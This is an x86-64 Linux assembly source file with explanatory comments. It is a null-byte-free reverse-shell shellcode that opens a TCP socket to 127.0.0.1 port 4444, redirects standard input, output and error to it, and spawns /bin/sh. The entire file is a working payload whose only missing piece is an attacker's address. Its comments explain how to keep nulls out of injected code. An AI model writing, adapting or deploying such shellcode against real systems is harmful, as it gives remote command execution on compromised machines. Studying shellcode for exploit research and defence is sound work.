BITS 64
SECTION .text
global _start
_start:
	; clear registers : 
	xor rax,rax
	xor rbx,rbx
	xor rcx,rcx
	xor rdi,rdi
	xor rsi,rsi
	xor rdx,rdx

	; Socket : 
	; %rax = 41 (System call) / %rdi = 2 (IPv4) / %rsi = 1 (TCP) / %rdx = 0 (Protocol)
	mov al,0x29		; sys_socket
	mov dil,0x2		; AF_INET
	mov sil,0x1		; TCP
	syscall
	mov r8,rax		; Socket Filedescriptor return in rax. Save in r8.
	
	; Connect :
	; %rax = 42 (System call) / %rdi = socket FD (save in r8) / %rsi = structAddr (IP,Port,2(AF_INET,IPv4)) / %rdx = 16 (AddrLen)
	mov rdi,r8
	mov r9,0x02010180	; 128.1.1.2
	sub r9,0x01010101	; 128.1.1.2 - 1.1.1.1 = 127.0.0.1 (in order to avoid nullbytes)
	push r9			; Push IPv4 address on the stack
	push word 0x5c11	; Port
	push word 0x2		; AF_INET
	push rsp
	pop rsi
	push 0x10		; AddrLen
	pop rdx
	push 0x2a		; sys_connect
	pop rax
	syscall

	; Duplicate File Descriptors / sys_dup2
	; %rax = 33 (System call) / %rdi = SocketFD (save in r8) / %rsi = 0 (stdin), 1 (stdout), 2 (stderr)
	mov al,0x21
	mov rdi,r8
	xor rsi,rsi		; stdin -> 0
	syscall
	mov al,0x21
	mov rdi,r8
	mov sil,0x1		; stdout -> 1, we put 0x1 in %sil to avoid nullbytes
	syscall
	mov al,0x21
	mov rdi,r8
	mov sil,0x2		; stderr -> 2
	syscall

	; execve /bin/sh
	; %rax = 59 (System call) / %rdi = pointer on 0x68732f6e69622f2f (//bin/sh in little endian) / %rsi = pointer on the address contained in %rdi / %rdx = 0 (arguments passed to /bin/sh)
	; Be careful to put the data on the stack with a nullbyte between each data.
	; This is what the stack should look like :

	; @address4 : @address2 point on /bin/sh -> @address4 in %rsi
	; @address3 : 0x00
	; @address2 : 0x68732f6e69622f2f (//bin/sh) -> @address2 in %rdi
	; @address1 : 0x00

	push rbx		; first nullbyte on the stack
	mov r10,0x68732f6e69622f2f
	push r10		; //bin/sh on the stack
	mov rdi,rsp
	push rbx		; second nullbyte
	push rdi		; push the address of /bin/sh on the stack
	mov rsi,rsp
	xor rdx,rdx		; arguments for /bin/sh (nothing)
	mov al,0x3b
	syscall

	; exit
	; close properly
	; %rax = 60 (System call) / %rdi = 0 (error code)
	mov al,0x3c
	xor rdi,rdi
	syscall
